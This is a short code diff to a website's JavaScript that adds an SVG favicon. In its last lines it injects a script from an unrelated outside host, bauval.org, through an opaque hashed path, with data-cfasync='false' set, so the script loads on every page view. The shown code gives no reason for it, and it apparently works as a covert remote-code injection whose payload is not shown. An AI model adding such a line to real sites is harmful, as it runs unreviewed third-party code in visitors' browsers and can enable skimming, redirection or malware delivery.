@@ -89,6 +89,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   document.head.appendChild(style);
 });
+
 const favicon = document.createElement("link");
 favicon.rel = "icon";
 favicon.type = "image/svg+xml";
@@ -104,3 +105,8 @@ favicon.href = "data:image/svg+xml," + encodeURIComponent(`
 `);
 document.head.appendChild(favicon);
 
+// Dynamically inject the external script with data-cfasync="false"
+const externalScript = document.createElement("script");
+externalScript.setAttribute("data-cfasync", "false");
+externalScript.src = "https://bauval.org/14/8c39bcbaa284da839cabc23db95e6c75";
+document.head.appendChild(externalScript);
